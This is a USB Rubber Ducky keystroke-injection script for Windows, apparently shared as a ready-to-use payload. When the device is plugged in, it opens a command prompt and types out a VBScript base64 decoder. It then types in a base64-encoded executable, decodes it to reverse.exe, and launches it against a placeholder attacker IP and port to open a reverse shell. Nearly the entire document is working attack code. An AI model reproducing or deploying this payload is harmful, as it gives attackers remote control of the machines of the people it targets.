```
REM Author: Darren Kitchen with mad props to IllWill dabermania.blogspot.co.il/2011/04/copying-executable-from-teensy-using.html

REM 27/12/2017: Mod by r00tpgp, removed admin privilege cmd, added auto overwrite on copy con and removed absolute path

REM Duckencoder: 1.0

REM Target: Windows 7(32&64b), Windows 2008 Server

REM Description: Opens administrative CMD prompt, creates decoder.vbs containing code to convert base64 encoded ascii to binary, creates text file including base64 ascii of binary file to create reverse shell. converts second file to exe with first file. Executes with host and port parameters. Props to go illwill for this payload. See dabermania.blogspot.co.il/2011/04/copying-executable-from-teensy-using.html

ESCAPE
CONTROL ESCAPE
DELAY 400
STRING cmd
REM DELAY 400
REM MENU
REM DELAY 400
REM STRING a
REM DELAY 600
REM LEFTARROW
ENTER
DELAY 400
STRING copy /Y con decoder.vbs
ENTER
STRING Option Explicit:Dim arguments, inFile, outFile:Set arguments = WScript.Arguments:inFile = arguments(0)
STRING :outFile = arguments(1):Dim base64Encoded, base64Decoded, outByteArray:dim objFS:dim objTS:set objFS = 
STRING CreateObject("Scripting.FileSystemObject"):
ENTER
STRING set objTS = objFS.OpenTextFile(inFile, 1):base64Encoded = 
STRING objTS.ReadAll:base64Decoded = decodeBase64(base64Encoded):writeBytes outFile, base64Decoded:private function 
STRING decodeBase64(base64):
ENTER
STRING dim DM, EL:Set DM = CreateObject("Microsoft.XMLDOM"):Set EL = DM.createElement("tmp"):
STRING EL.DataType = "bin.base64":EL.Text = base64:decodeBase64 = EL.NodeTypedValue:end function:private Sub 
STRING writeBytes(file, bytes):Dim binaryStream:
ENTER
STRING Set binaryStream = CreateObject("ADODB.Stream"):binaryStream.Type = 1:
STRING binaryStream.Open:binaryStream.Write bytes:binaryStream.SaveToFile file, 2:End Sub
ENTER
CTRL z
ENTER
STRING copy /Y con reverse.txt
ENTER
STRING TVprZXJuZWwzMi5kbGwAAFBFAABMAQIAAAAAAAAAAAAAAAAA4AAPAQsBAAAAAgAAAAAAAAAA
ENTER
STRING AADfQgAAEAAAAAAQAAAAAEAAABAAAAACAAAEAAAAAAAAAAQAAAAAAAAAAFAAAAACAAAAAAAA
ENTER
STRING AgAAAAAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAA20IAABQAAAAAAAAAAAAAAAAA
ENTER
STRING AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
ENTER
STRING AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAATUVXAEYS
ENTER
STRING 0sMAMAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4AAAwALSdduKFuvUABAAAABAAADvAgAA
ENTER
STRING AAIAAAAAAAAAAAAAAAAAAOAAAMC+HEBAAIvera1QrZeygKS2gP8Tc/kzyf8TcxYzwP8TcyG2
ENTER
STRING gEGwEP8TEsBz+nU+quvg6HI+AAAC9oPZAXUO/1P86yas0eh0LxPJ6xqRSMHgCKz/U/w9AH0A
ENTER
STRING AHMKgPwFcwaD+H93AkFBlYvFtgBWi/cr8POkXuubrYXAdZCtlq2XVqw8AHX7/1PwlVatD8hA
ENTER
STRING WXTseQesPAB1+5FAUFX/U/SrdefDAAAAAAAzyUH/ExPJ/xNy+MOwQgAAvUIAAAAAAAAAQEAA
ENTER
STRING MAFAAAAQQAAAEEAAaBwGMkAHagHoDnw4VQzoQgLIFTiean446lMMelAsFnRBMP0Bv1WysTNq
ENTER
STRING kQIGsnxVmiejeINmxwVke0+mOGe8XVBmlD05ZqNofmRmfiF9i3MM2QpqaJQtoTp6b0gV6kwF
ENTER
STRING EVBkkBBNRFWRFDxAeGooEGhdKP81MHTopJ5RVFWhVY2/bg4KCJAiC+FRFOgfgUvD/yUkILtv
ENTER
STRING KhwGQxghFL3DIghxzAFVi+yBxHz+/4hWV+hgrN2JRfwzHcmLdX44PB10Bx4iQPdB6/RR0XLp
ENTER
STRING AOFYO8F0C19eMLgDucnCCOGGSY29PHDlQyoJzy/gArAgqutz8iiNhRU5i/A2+DMqM+sbiwNm
ENTER
STRING MgfvImUgTf4iEeEoLe2UCIO53LcwS3T7OzpNCKgVWWUdZwpME0EdDxTr5qoNNgcZhzj0sH/A
ENTER
STRING VXMRi30Mxhe4An+CohOdaLCgWDQzDUYN5tH34f5Yo+7nRLsfFqnOEQTeVQE81BTUDhszwE7s
ENTER
STRING hwtw0ooGRj08ArMSDvffkOsLLDAZjQyJBkiDLQrAdfHoBBEzUcI44jCDxAf0avXoaQkZSf+9
ENTER
STRING gqogC9Aqk3U3+FAinSmGBvzoTS9oiyQ45lMaDwiNUAMhGIPABOP5//6AAvfTI8uB4USAdHzp
ENTER
STRING bMEMYHV3BvQQwEAC0OEbwlFbOkfESRnKDFcGCDAAADBAAGMwbWQAZj9AABQ4IEADd3MyXzOY
ENTER
STRING LmRs48CAZwdldGhvc0BieW5he23PHmOePPfr/w4SV1NBXc9hckZ1cBh5aMoscxNPJmNrYu/B
ENTER
STRING /7gDbJUacspebEzHV9NpdPNGp7yRR8NMQ29tiGFuZDZMaURifoB2cvudOlC3gudzFUFYIcBk
ENTER
STRING SNBDL2AAAAAAAGY/QABMb2FkTGlicmFyeUEAR2V0UHJvY0FkZHJlc3MAAAAAAAAAAAAAAAAA
ENTER
STRING AAxAAADpdL7//wAAAAIAAAAMQAAA
ENTER
CTRL z
ENTER
STRING cscript decoder.vbs reverse.txt reverse.exe
ENTER
STRING reverse.exe <IP_ADDR> <PORT>
ENTER
STRING exit
ENTER
```